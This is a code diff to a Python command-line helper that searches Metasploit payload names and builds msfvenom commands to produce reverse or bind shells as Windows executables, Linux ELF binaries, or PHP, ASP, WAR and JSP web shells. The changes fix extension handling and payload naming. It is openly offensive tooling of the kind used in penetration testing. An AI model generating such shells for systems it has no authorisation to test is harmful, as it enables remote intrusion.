@@ -109,27 +109,30 @@ def print_available_payloads(keywords,payload_list):
             else:
                 # Relaxing filter by removing BIND and STAGED items
                 keywords = keywords.replace('bind','').replace('staged','').strip()
-                print("Searching again with : ",  keywords)
+                print(Green("Searching again with : "),  keywords)
                 #test again for results
                 return print_available_payloads(keywords,payload_list)
                 
 
-def generate_payload(params,number,avail_payloads,pname):
-    
+def generate_payload(params,number,avail_payloads):
     K_TYPE ,K_ARCH,K_MET, K_BIND, K_STAGE, K_EXT, K_KEY, IP, PORT = params
+    print(params)
+    pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
+    print(pname)
+    
     HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
     
     payload_cmd =avail_payloads[number].split()[0]
           
-    if K_TYPE == "windows":
+    if args.SHELL_TYPE == "web":
+         K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
+         payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_EXT)
+    
+    elif K_TYPE == "windows":
         payload="msfvenom -p {} {}={} LPORT={} -f exe -o {}".format(payload_cmd,HOST, IP,PORT,pname+".exe")
         
     elif K_TYPE== "linux":
         payload="msfvenom -p {} {}={} LPORT={} -f elf -o {}".format(payload_cmd,HOST, IP,PORT,pname+".elf")
-    
-    elif args.SHELL_TYPE == "web":
-         payload="msfvenom -p {} {}={} LPORT={} -f raw -o {}".format(payload_cmd,HOST, IP,PORT,pname + K_EXT)
-         
     
     print("="*150)
     print("[*] Generating Payload")
@@ -202,14 +205,14 @@ if __name__ == "__main__":
             K_TYPE =""
             print(Green("[+] Available web payloads: 1.PHP 2.WIN-ASP 3.Java-WAR 4.Java-JSP"))
                
-            ext_list = ['.php', '.asp','.war','.jsp']
+            ext_list = ['php', 'asp','war','jsp']
             K_WEB = int(input(Green("[*] Enter your specific type of payload : ")))
             K_EXT= ext_list[K_WEB-1]
-            if K_EXT == ".war" or K_EXT == ".jsp":
+            if K_EXT == "war" or K_EXT == "jsp":
                 K_TYPE = "java"
-            elif K_EXT == ".php":
+            elif K_EXT == "php":
                 K_TYPE = "php"
-            elif K_EXT == ".asp":
+            elif K_EXT == "asp":
                 K_TYPE = "windows"
         
     K_KEY= args.keyword if args.keyword else ""	
@@ -224,13 +227,11 @@ if __name__ == "__main__":
     K_BIND = "reverse" if args.rev else "bind"
     K_STAGE = " " if args.stageless else "staged"
     
-    
-    params = [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE,K_EXT, K_KEY]
-    keywords_string= " ".join(params)     
+    keywords_string= " ".join([K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE, K_KEY])     
     
     
     if args.SHELL_TYPE =="web":
-        # WEB payloads don't have K_ARCH, K_STAGE, K_EXT mentionned
+        # WEB payloads don't have K_ARCH, K_STAGE mentionned
         # We should remove those keywords 
         keywords_string= keywords_string.replace(K_ARCH,'')
         keywords_string= keywords_string.replace(K_STAGE,'')
@@ -240,8 +241,7 @@ if __name__ == "__main__":
     # Print available payloads
     avail_payloads = print_available_payloads(keywords_string,payload_list)    
     i= int(input("[*] Please enter your payload number: "))
-    pname = " ".join(keywords_string.split()).replace(" ","-")
-    
+        
     # Finally Get IP and PORT or Ask for them
     if args.ip :
         IP = args.ip
@@ -258,8 +258,8 @@ if __name__ == "__main__":
     else:
         PORT = int(input("[*] Enter port number for shell: "))   
     
-    params += [IP,PORT]
-    generate_payload(params,i,avail_payloads,pname)
+    params =  [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE,K_EXT, K_KEY, IP, PORT]
+    generate_payload(params,i,avail_payloads)
     print(Green("[+] Bye ! "))
     
             
